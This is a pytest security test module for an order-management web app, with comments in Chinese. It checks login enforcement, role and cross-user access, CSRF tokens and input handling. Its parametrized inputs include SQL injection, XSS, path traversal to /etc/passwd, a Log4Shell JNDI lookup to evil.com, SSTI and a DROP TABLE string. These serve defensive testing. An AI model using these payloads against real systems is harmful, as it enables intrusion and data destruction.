"""L2: 权限与安全测试"""
import pytest
import requests

from tests.conftest import SERVICES
from tests.core.api_client import APIClient


@pytest.mark.L2
@pytest.mark.security
class TestAuthentication:
    """认证测试"""
    
    def test_unauthenticated_access_blocked(self):
        """未登录访问应被阻止"""
        # 直接访问需要登录的 API
        r = requests.get(f'{SERVICES["desktop_web"]}/api/orders/list', timeout=5)
        # 应该返回 401/302/403，而不是 200
        assert r.status_code in [401, 302, 403]
    
    def test_invalid_token_rejected(self):
        """无效 Token 应被拒绝"""
        api = APIClient('desktop_web')
        api.cookies['session'] = 'invalid_token_xyz'
        r = api.get('/api/orders/list')
        assert r.status_code in [401, 302, 403]
    
    def test_sql_injection_blocked(self):
        """SQL 注入应被阻止"""
        api = APIClient('desktop_web')
        r = api.get("/api/orders/' OR '1'='1")
        # 不应返回 500
        assert r.status_code < 500
    
    def test_xss_payload_escaped(self, page, login_as):
        """XSS 负载应被转义"""
        login_as('admin')
        page.goto(f'{SERVICES["desktop_web"]}/orders')
        page.wait_for_load_state('networkidle')
        
        # 注入测试输入
        xss_payload = '<script>alert("xss")</script>'
        search = page.locator('input[type=search], input[name=search], input[placeholder*=搜索]')
        if search.count() > 0:
            search.first.fill(xss_payload)
            page.wait_for_timeout(1000)
            # 不应弹窗（如果弹窗则测试失败）
            # 也可检查 HTML 中没有未转义的 script
            content = page.content()
            assert xss_payload not in content or '&lt;script' in content


@pytest.mark.L2
@pytest.mark.security
class TestAuthorization:
    """授权测试"""
    
    def test_cross_role_access_denied(self):
        """跨角色访问应被拒绝"""
        # 用操作员 token 访问管理功能
        api = APIClient('mobile')
        # 假设操作员没有 admin 权限
        r = api.post('/api/admin/reset', json={})
        # 应返回 403
        assert r.status_code in [401, 403, 404]
    
    def test_horizontal_privilege_escalation(self):
        """水平权限提升应被阻止"""
        # 用户 A 的 token 访问用户 B 的数据
        api = APIClient('mobile')
        r = api.get('/api/order/ORD-OTHER-USER-DATA')
        assert r.status_code in [401, 403, 404]


@pytest.mark.L2
@pytest.mark.security
class TestCSRF:
    """CSRF 测试"""
    
    def test_csrf_token_required_for_state_change(self, page, login_as):
        """状态变更应需要 CSRF Token"""
        user = login_as('admin')
        # 检查表单提交是否带 CSRF token
        page.goto(f'{SERVICES["desktop_web"]}/orders')
        page.wait_for_load_state('networkidle')
        
        # 查找任何表单
        forms = page.locator('form')
        if forms.count() > 0:
            # 表单中应有 CSRF token
            csrf_input = page.locator('input[name=csrf_token], input[name=_token], meta[name=csrf-token]')
            # 不强制要求，但应记录
            has_csrf = csrf_input.count() > 0
            print(f"\n📝 CSRF Token 存在: {has_csrf}")


@pytest.mark.L2
@pytest.mark.security
class TestInputValidation:
    """输入验证测试"""
    
    @pytest.mark.parametrize('payload', [
        '<script>alert(1)</script>',
        '" onmouseover="alert(1)',
        '../../../etc/passwd',
        '${jndi:ldap://evil.com/a}',  # Log4Shell
        '{{7*7}}',  # SSTI
        '1; DROP TABLE users;--',
    ])
    def test_malicious_input_handled(self, page, login_as, payload):
        """恶意输入应被处理"""
        login_as('admin')
        page.goto(f'{SERVICES["desktop_web"]}/orders')
        page.wait_for_load_state('networkidle')
        
        # 尝试注入
        search = page.locator('input[type=search], input[name=search]').first
        if search.is_visible():
            search.fill(payload)
            page.wait_for_timeout(500)
            # 页面不应崩溃
            assert page.locator('body').is_visible()
            S = page.locator('#e, .error, .alert-error').first
            # 应有错误提示或输入被过滤
